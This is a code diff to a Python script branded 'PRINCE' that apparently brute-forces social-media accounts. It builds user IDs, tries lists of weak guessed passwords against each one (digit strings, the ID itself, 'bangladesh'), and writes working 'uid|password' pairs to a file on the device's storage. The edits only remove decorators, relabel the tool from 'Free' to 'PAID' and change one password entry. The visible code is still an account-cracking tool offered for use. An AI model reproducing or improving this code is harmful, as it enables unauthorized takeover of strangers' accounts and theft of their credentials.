@@ -345,24 +345,24 @@ shuffled_connection_token = shuffle_string(random_string)
 
 
 class sort:
-    @staticmethod
+    
     def line():
         return "[b dark_sea_green2]━" * 37
 
-    @staticmethod
+    
     def clear():
         os.system("clear")
 
-    @staticmethod
+    
     def logo():
         aci = f'''        //   ) )                                      
        //___/ /  __     ( )   __      ___      ___    
       / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
      //       //      / / //   / / //       //        
-    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Free[/r]\n{sort.line()}'''
+    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
         print(aci)
 
-    @staticmethod
+    
     def color():
         co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
         cx = random.choice(co)
@@ -487,7 +487,7 @@ def file_sub(uid, pwx, name, meth, fl):
                 print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                 oks.append(uid)
-
+                
                 break
             else:
                 continue
@@ -627,7 +627,7 @@ def ran():
             else:
                 uid = "0" + xd
             if ask in ["1", "01", "a", "A"]:
-                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
+                pwx = ["57575751", "57575751", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
                 pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####",
                        "১২৩৪৫৬"]
